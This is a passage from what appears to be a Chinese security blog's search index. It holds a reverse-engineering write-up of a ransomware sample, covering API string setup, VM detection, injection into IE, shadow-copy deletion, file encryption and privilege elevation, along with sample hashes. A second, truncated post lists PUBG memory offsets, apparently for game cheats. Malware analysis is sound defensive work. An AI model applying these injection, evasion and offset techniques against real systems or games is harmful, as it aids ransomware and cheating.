src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/document_image_rId26.png\" alt=\"document_image_rId26\"></p>\n<p>老规矩，直接弄出他的shellcode。</p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/document_image_rId27.png\" alt=\"document_image_rId27\"></p>\n<h1 id=\"ShellCode1分析\"><a href=\"#ShellCode1分析\" class=\"headerlink\" title=\"ShellCode1分析\"></a>ShellCode1分析</h1><p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/document_image_rId28.png\" alt=\"document_image_rId28\"></p>\n<p>以0，1和0，0不同参数执行了两次call</p>\n<p>函数进来会进行字符串初始化，用于后面调用api</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">strcpy</span>(str_kernel32, <span class=\"string\">&quot;kernel32.dll&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">strcpy</span>(str_ntdll, <span class=\"string\">&quot;ntdll.dll&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">strcpy</span>(str_shell32, <span class=\"string\">&quot;shell32.dll&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">strcpy</span>(str_advapi32, <span class=\"string\">&quot;advapi32.dll&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">strcpy</span>(str_psapi, <span class=\"string\">&quot;psapi.dll&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">strcpy</span>(str_GetProcAddress, <span class=\"string\">&quot;GetProcAddress&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">strcpy</span>(str_GetModuleHandleA, <span class=\"string\">&quot;GetModuleHandleA&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">strcpy</span>(str_GetModuleFileNameA, <span class=\"string\">&quot;GetModuleFileNameA&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">strcpy</span>(str_GetModuleFileNameW, <span class=\"string\">&quot;GetModuleFileNameW&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">strcpy</span>(str_CreateProcessA, <span class=\"string\">&quot;CreateProcessA&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">strcpy</span>(str_CreateProcessW, <span class=\"string\">&quot;CreateProcessW&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">strcpy</span>(str_CreateToolhelp32Snapshot, <span class=\"string\">&quot;CreateToolhelp32Snapshot&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">strcpy</span>(str_Process32First, <span class=\"string\">&quot;Process32First&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">strcpy</span>(str_Process32Next, <span class=\"string\">&quot;Process32Next&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">strcpy</span>(str_Module32First, <span class=\"string\">&quot;Module32First&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">strcpy</span>(str_Module32Next, <span class=\"string\">&quot;Module32Next&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">strcpy</span>(str_CloseHandle, <span class=\"string\">&quot;CloseHandle&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">strcpy</span>(str_GetCurrentProcess, <span class=\"string\">&quot;GetCurrentProcess&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">strcpy</span>(str_GlobalAlloc, <span class=\"string\">&quot;GlobalAlloc&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">strcpy</span>(str_OpenProcessToken, <span class=\"string\">&quot;OpenProcessToken&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">strcpy</span>(str_GetTokenInformation, <span class=\"string\">&quot;GetTokenInformation&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">strcpy</span>(str_AllocateAndInitializeSid, <span class=\"string\">&quot;AllocateAndInitializeSid&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">strcpy</span>(str_EqualSid, <span class=\"string\">&quot;EqualSid&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">strcpy</span>(str_LookupAccountSidA, <span class=\"string\">&quot;LookupAccountSidA&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">strcpy</span>(str_OpenMutexA, <span class=\"string\">&quot;OpenMutexA&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">strcpy</span>(str_CreateMutexA, <span class=\"string\">&quot;CreateMutexA&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">strcpy</span>(str_CreateFileA, <span class=\"string\">&quot;CreateFileA&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">strcpy</span>(str_CreateFileW, <span class=\"string\">&quot;CreateFileW&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">strcpy</span>(str_GetFileSize, <span class=\"string\">&quot;GetFileSize&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">strcpy</span>(str_ReadFile, <span class=\"string\">&quot;ReadFile&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">strcpy</span>(str_GetSystemDirectoryA, <span class=\"string\">&quot;GetSystemDirectoryA&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">strcpy</span>(str_GetSystemDirectoryW, <span class=\"string\">&quot;GetSystemDirectoryW&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">strcpy</span>(str_SetFileAttributesW, <span class=\"string\">&quot;SetFileAttributesW&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">strcpy</span>(str_MoveFileExW, <span class=\"string\">&quot;MoveFileExW&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">strcpy</span>(str_SHGetSpecialFolderPathA, <span class=\"string\">&quot;SHGetSpecialFolderPathA&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">strcpy</span>(str_SHGetSpecialFolderPathW, <span class=\"string\">&quot;SHGetSpecialFolderPathW&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">strcpy</span>(str_RegOpenKeyExA, <span class=\"string\">&quot;RegOpenKeyExA&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">strcpy</span>(str_RegOpenKeyExW, <span class=\"string\">&quot;RegOpenKeyExW&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">strcpy</span>(str_RegSetValueExA, <span class=\"string\">&quot;RegSetValueExA&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">strcpy</span>(str_RegSetValueExW, <span class=\"string\">&quot;RegSetValueExW&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">strcpy</span>(str_RegQueryValueExA, <span class=\"string\">&quot;RegQueryValueExA&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">strcpy</span>(str_RegQueryValueExW, <span class=\"string\">&quot;RegQueryValueExW&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">strcpy</span>(str_RegCloseKey, <span class=\"string\">&quot;RegCloseKey&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">strcpy</span>(str_CreateDirectoryW, <span class=\"string\">&quot;CreateDirectoryW&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">strcpy</span>(str_ExitProcess, <span class=\"string\">&quot;ExitProcess&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">strcpy</span>(str_Sleep, <span class=\"string\">&quot;Sleep&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">strcpy</span>(str_GetFileTime, <span class=\"string\">&quot;GetFileTime&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">strcpy</span>(str_SetFileTime, <span class=\"string\">&quot;SetFileTime&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">strcpy</span>(str_CopyFileW, <span class=\"string\">&quot;CopyFileW&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">strcpy</span>(str_DeleteFileW, <span class=\"string\">&quot;DeleteFileW&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">strcpy</span>(str_VirtualAlloc, <span class=\"string\">&quot;VirtualAlloc&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">strcpy</span>(str_GetTickCount, <span class=\"string\">&quot;GetTickCount&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">strcpy</span>(str_IsWow64Process, <span class=\"string\">&quot;IsWow64Process&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">strcpy</span>(str_OpenProcess, <span class=\"string\">&quot;OpenProcess&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">strcpy</span>(str_DuplicateHandle, <span class=\"string\">&quot;DuplicateHandle&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">strcpy</span>(str_NtUnmapViewOfSection, <span class=\"string\">&quot;NtUnmapViewOfSection&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">strcpy</span>(str_VirtualAllocEx, <span class=\"string\">&quot;VirtualAllocEx&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">strcpy</span>(str_WriteProcessMemory, <span class=\"string\">&quot;WriteProcessMemory&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">strcpy</span>(str_GetThreadContext, <span class=\"string\">&quot;GetThreadContext&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">strcpy</span>(str_SetThreadContext, <span class=\"string\">&quot;SetThreadContext&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">strcpy</span>(str_ResumeThread, <span class=\"string\">&quot;ResumeThread&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">strcpy</span>(str_SuspendThread, <span class=\"string\">&quot;SuspendThread&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">strcpy</span>(str_TerminateProcess, <span class=\"string\">&quot;TerminateProcess&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">strcpy</span>(str_NtReadVirtualMemory, <span class=\"string\">&quot;NtReadVirtualMemory&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">strcpy</span>(str_GetCommandLineW, <span class=\"string\">&quot;GetCommandLineW&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">strcpy</span>(str_GetProcessMemoryInfo, <span class=\"string\">&quot;GetProcessMemoryInfo&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">strcpy</span>(str_WriteFile, <span class=\"string\">&quot;WriteFile&quot;</span>);</span><br></pre></td></tr></table></figure>\n\n<p>初始化完毕后，根据参数值进行分支操作，由于第一个参数为1，这里从1开始。</p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/document_image_rId29.png\" alt=\"document_image_rId29\"></p>\n<p>首先进行了一些看不懂的文件操作。</p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/document_image_rId30.png\" alt=\"document_image_rId30\"></p>\n<p>然后开始解密新的shellcode</p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/document_image_rId31.png\" alt=\"document_image_rId31\"></p>\n<p>然后开始进行一下虚拟机检测之类的东西</p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/document_image_rId32.png\" alt=\"document_image_rId32\"></p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/document_image_rId33.png\" alt=\"document_image_rId33\"></p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/document_image_rId34.png\" alt=\"document_image_rId34\"></p>\n<p>然后是运行一个脚本，但是这个脚本在整个分析过程中没有碰到。</p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/document_image_rId35.png\" alt=\"document_image_rId35\"></p>\n<p>该shellcode的内容比较多，最后会执行到比较核心的内容。</p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/document_image_rId36.png\" alt=\"document_image_rId36\"></p>\n<p>首先是判断电脑是否存在浏览器。</p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/document_image_rId37.png\" alt=\"document_image_rId37\"></p>\n<p>如果IE存在，则启动IE浏览器，以IE浏览器为目标程序，解密一个资源文件并内存加载到IE中。反之自启动一份作为目标进程。</p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/document_image_rId38.png\" alt=\"document_image_rId38\"></p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/document_image_rId39.png\" alt=\"document_image_rId39\"></p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/document_image_rId40.png\" alt=\"document_image_rId40\"></p>\n<p>动态调试直接捕获到最终加载的**恶意样本(7396C43A6E8CCA2F811939EF1BE71B73)**。</p>\n<h1 id=\"ShellCode2\"><a href=\"#ShellCode2\" class=\"headerlink\" title=\"ShellCode2\"></a>ShellCode2</h1><table>\n<thead>\n<tr>\n<th>MD5</th>\n<th>7396c43a6e8cca2f811939ef1be71b73</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>SHA1</td>\n<td>a7dace43bcc5e7108a9827dd3a7e03c30acdeeba</td>\n</tr>\n<tr>\n<td>SHA256</td>\n<td>5548fec3bae254f7882d9b681080261ba588bc05cb63a81a28107ff49f71c513</td>\n</tr>\n<tr>\n<td>File size</td>\n<td>52.00 KB (53248 bytes)}</td>\n</tr>\n</tbody></table>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/document_image_rId41.png\" alt=\"document_image_rId41\"></p>\n<p>该样本首先创建一个互斥名作为单例启动。</p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/document_image_rId42.png\" alt=\"document_image_rId42\"></p>\n<p>随后删除了卷影文件，防止通过该文件进行文件恢复。</p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/document_image_rId43.png\" alt=\"document_image_rId43\"></p>\n<p>然后开始加密文件。</p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/document_image_rId44.png\" alt=\"document_image_rId44\"></p>\n<p>加密过程主要是遍历电脑磁盘和移动硬盘文件。</p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/document_image_rId45.png\" alt=\"document_image_rId45\"></p>\n<p>然后查看文件是否为需要加密的文件。</p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/document_image_rId46.png\" alt=\"document_image_rId46\"></p>\n<p>以下为该样本所要加密的文件后缀。</p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/document_image_rId47.png\" alt=\"document_image_rId47\"></p>\n<p>加密后的文件在文件的头部会存在一个CRC32的值，该值由原文件前128个字节计算来的。样本会判断前面这个CRC32的值来判断是否需要加密。</p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/document_image_rId48.png\" alt=\"document_image_rId48\"></p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/document_image_rId49.png\" alt=\"document_image_rId49\"></p>\n<p>之后开始进行隐藏文件和创建快捷方式</p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/document_image_rId50.png\" alt=\"document_image_rId50\"></p>\n<p>隐藏文件。</p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/document_image_rId51.png\" alt=\"document_image_rId51\"></p>\n<p>创建快捷方式，并重定向为临时目录的样本文件。</p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/document_image_rId52.png\" alt=\"document_image_rId52\"></p>\n<p>然后进行疑似横向感染操作。</p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/document_image_rId53.png\" alt=\"document_image_rId53\"></p>\n<p>然后开始解密HTML数据，就是运行样本后弹出的那个网页。</p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/document_image_rId54.png\" alt=\"document_image_rId54\"></p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/document_image_rId55.png\" alt=\"document_image_rId55\"></p>\n<p>该样本在运行之初会判断是否为管理员运行，如果不是管理员，会以管理员模式运行，并关闭当前进程。</p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/document_image_rId56.png\" alt=\"document_image_rId56\"></p>\n<p>该样本中还存在疑似公钥的东西，估计是可以用来解密，但是本人对加密这一块比较弱，就没去详细分析。</p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/document_image_rId57.png\" alt=\"document_image_rId57\"></p>\n<p>至于提供样本的那个老哥问怎么解决，我这边建议闲鱼5元包邮送出远方。</p>\n<p><img src=\"/../images/Virus/%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/document_image_rId58.png\" alt=\"document_image_rId58\"></p>\n","categories":["Virus"]},{"title":"七、PUBG偏移获取","url":"/2024/04/21/%E4%B8%83%E3%80%81PUBG%E5%81%8F%E7%A7%BB%E8%8E%B7%E5%8F%96/","content":"<h1 id=\"PUBG偏移获取\"><a href=\"#PUBG偏移获取\" class=\"headerlink\" title=\"PUBG偏移获取\"></a>PUBG偏移获取</h1><h1 id=\"Offset-Xedecryption\"><a href=\"#Offset-Xedecryption\" class=\"headerlink\" title=\"Offset_Xedecryption\"></a>Offset_Xedecryption</h1><p>搜索getRootComponent</p>\n<p><img src=\"/../images/UnrealEngine/%E4%B8%83%E3%80%81PUBG%E5%81%8F%E7%A7%BB%E8%8E%B7%E5%8F%96/document_image_rId4.png\" alt=\"document_image_rId4\"></p>\n<p><img src=\"/../images/UnrealEngine/%E4%B8%83%E3%80%81PUBG%E5%81%8F%E7%A7%BB%E8%8E%B7%E5%8F%96/document_image_rId5.png\" alt=\"document_image_rId5\"></p>\n<h1 id=\"Offset-rootComponent\"><a href=\"#Offset-rootComponent\" class=\"headerlink\" title=\"Offset_rootComponent\"></a>Offset_rootComponent</h1><p><img src=\"/../images/UnrealEngine/%E4%B8%83%E3%80%81PUBG%E5%81%8F%E7%A7%BB%E8%8E%B7%E5%8F%96/document_image_rId6.png\" alt=\"document_image_rId6\"></p>\n<p><img src=\"/../images/UnrealEngine/%E4%B8%83%E3%80%81PUBG%E5%81%8F%E7%A7%BB%E8%8E%B7%E5%8F%96/document_image_rId7.png\" alt=\"document_image_rId7\"></p>\n<h1 id=\"Offset-TslGameState\"><a href=\"#Offset-TslGameState\" class=\"headerlink\" title=\"Offset_TslGameState\"></a>Offset_TslGameState</h1><p><img src=\"/../images/UnrealEngine/%E4%B8%83%E3%80%81PUBG%E5%81%8F%E7%A7%BB%E8%8E%B7%E5%8F%96/document_image_rId8.png\" alt=\"document_image_rId8\"></p>\n<p><img src=\"/../images/UnrealEngine/%E4%B8%83%E3%80%81PUBG%E5%81%8F%E7%A7%BB%E8%8E%B7%E5%8F%96/document_image_rId9.png\" alt=\"document_image_rId9\"></p>\n<p><img src=\"/../images/UnrealEngine/%E4%B8%83%E3%80%81PUBG%E5%81%8F%E7%A7%BB%E8%8E%B7%E5%8F%96/document_image_rId10.png\" alt=\"document_image_rId10\"></p>\n<h1 id=\"Offset-WorldToMiniMap\"><a href=\"#Offset-WorldToMiniMap\" class=\"headerlink\" title=\"Offset_WorldToMiniMap\"></a>Offset_WorldToMiniMap</h1><p><img src=\"/../images/UnrealEngine/%E4%B8%83%E3%80%81PUBG%E5%81%8F%E7%A7%BB%E8%8E%B7%E5%8F%96/document_image_rId11.png\" alt=\"document_image_rId11\"></p>\n<p><img src=\"/../images/UnrealEngine/%E4%B8%83%E3%80%81PUBG%E5%81%8F%E7%A7%BB%E8%8E%B7%E5%8F%96/document_image_rId12.png\" alt=\"document_image_rId12\"></p>\n<p><img src=\"/../images/UnrealEngine/%E4%B8%83%E3%80%81PUBG%E5%81%8F%E7%A7%BB%E8%8E%B7%E5%8F%96/document_image_rId13.png\" alt=\"document_image_rId13\"></p>\n<h1 id=\"Offset-AcknowledgedPawn\"><a href=\"#Offset-AcknowledgedPawn\" class=\"headerlink\" title=\"Offset_AcknowledgedPawn\"></a>Offset_AcknowledgedPawn</h1><p><img src=\"/../images/UnrealEngine/%E4%B8%83%E3%80%81PUBG%E5%81%8F%E7%A7%BB%E8%8E%B7%E5%8F%96/document_image_rId14.png\" alt=\"document_image_rId14\"></p>\n<p><img src=\"/../images/UnrealEngine/%E4%B8%83%E3%80%81PUBG%E5%81%8F%E7%A7%BB%E8%8E%B7%E5%8F%96/document_image_rId15.png\" alt=\"document_image_rId15\"></p>\n<p><img src=\"/../images/UnrealEngine/%E4%B8%83%E3%80%81PUBG%E5%81%8F%E7%A7%BB%E8%8E%B7%E5%8F%96/document_image_rId16.png\" alt=\"document_image_rId16\"></p>\n<h1 id=\"Offset-GroggyHealth\"><a href=\"#Offset-GroggyHealth\" class=\"headerlink\" title=\"Offset_GroggyHealth\"></a>Offset_GroggyHealth</h1><p><img src=\"/../images/UnrealEngine/%E4%B8%83%E3%80%81PUBG%E5%81%8F%E7%A7%BB%E8%8E%B7%E5%8F%96/document_image_rId17.png\" alt=\"document_image_rId17\"></p>\n<p><img src=\"/../images/UnrealEngine/%E4%B8%83%E3%80%81PUBG%E5%81%8F%E7%A7%BB%E8%8E%B7%E5%8F%96/document_image_rId18.png\" alt=\"document_image_rId18\"></p>\n<p><img src=\"/../images/UnrealEngine/%E4%B8%83%E3%80%81PUBG%E5%81%8F%E7%A7%BB%E8%8E%B7%E5%8F%96/document_image_rId19.png\" alt=\"document_image_rId19\"></p>\n<h1 id=\"Offset-Health\"><a href=\"#Offset-Health\" class=\"headerlink\" title=\"Offset_Health\"></a>Offset_Health</h1><p><img src=\"/../images/UnrealEngine/%E4%B8%83%E3%80%81PUBG%E5%81%8F%E7%A7%BB%E8%8E%B7%E5%8F%96/document_image_rId20.png\" alt=\"document_image_rId20\"></p>\n<p><img src=\"/../images/UnrealEngine/%E4%B8%83%E3%80%81PUBG%E5%81%8F%E7%A7%BB%E8%8E%B7%E5%8F%96/document_image_rId21.png\" alt=\"document_image_rId21\"></p>\n<p><img src=\"/../images/UnrealEngine/%E4%B8%83%E3%80%81PUBG%E5%81%8F%E7%A7%BB%E8%8E%B7%E5%8F%96/document_image_rId22.png\" alt=\"document_image_rId22\"></p>\n<h1 id=\"Offset-SpectatedCount\"><a href=\"#Offset-SpectatedCount\" class=\"headerlink\" title=\"Offset_SpectatedCount\"></a>Offset_SpectatedCount</h1><p><img src=\"/../images/UnrealEngine/%E4%B8%83%E3%80%81PUBG%E5%81%8F%E7%A7%BB%E8%8E%B7%E5%8F%96/document_image_rId23.png\" alt=\"document_image_rId23\"></p>\n<p><img src=\"/../images/UnrealEngine/%E4%B8%83%E3%80%81PUBG%E5%81%8F%E7%A7%BB%E8%8E%B7%E5%8F%96/document_image_rId24.png\" alt=\"document_image_rId24\"></p>\n<h1 id=\"Offset-LastTeamNum\"><a href=\"#Offset-LastTeamNum\" class=\"headerlink\" title=\"Offset_LastTeamNum\"></a>Offset_LastTeamNum</h1><p><img src=\"/../images/UnrealEngine/%E4%B8%83%E3%80%81PUBG%E5%81%8F%E7%A7%BB%E8%8E%B7%E5%8F%96/document_image_rId25.png\" alt=\"document_image_rId25\"></p>\n<p><img src=\"/../images/UnrealEngine/%E4%B8%83%E3%80%81PUBG%E5%81%8F%E7%A7%BB%E8%8E%B7%E5%8F%96/document_image_rId26.png\" alt=\"document_image_rId26\"></p>\n<h1 id=\"Offset-ChunkSize\"><a href=\"#Offset-ChunkSize\" class=\"headerlink\" title=\"Offset_ChunkSize\"></a>Offset_ChunkSize</h1><p><img src=\"/../images/UnrealEngine/%E4%B8%83%E3%80%81PUBG%E5%81%8F%E7%A7%BB%E8%8E%B7%E5%8F%96/document_image_rId27.png\" alt=\"document_image_rId27\"></p>\n<p><img src=\"/../images/UnrealEngine/%E4%B8%83%E3%80%81PUBG%E5%81%8F%E7%A7%BB%E8%8E%B7%E5%8F%96/document_image_rId28.png\" alt=\"document_image_rId28\"></p>\n<p><img src=\"/../images/UnrealEngine/%E4%B8%83%E3%80%81PUBG%E5%81%8F%E7%A7%BB%E8%8E%B7%E5%8F%96/document_image_rId29.png\" alt=\"document_image_rId29\"></p>\n<h1 id=\"Offset-GName\"><a href=\"#Offset-GName\" class=\"headerlink\" title=\"Offset_GName\"></a>Offset_GName</h1><p><img src=\"/../images/UnrealEngine/%E4%B8%83%E3%80%81PUBG%E5%81%8F%E7%A7%BB%E8%8E%B7%E5%8F%96/document_image_rId30.png\" alt=\"document_image_rId30\"></p>\n<p><img src=\"/../images/UnrealEngine/%E4%B8%83%E3%80%81PUBG%E5%81%8F%E7%A7%BB%E8%8E%B7%E5%8F%96/document_image_rId31.png\" 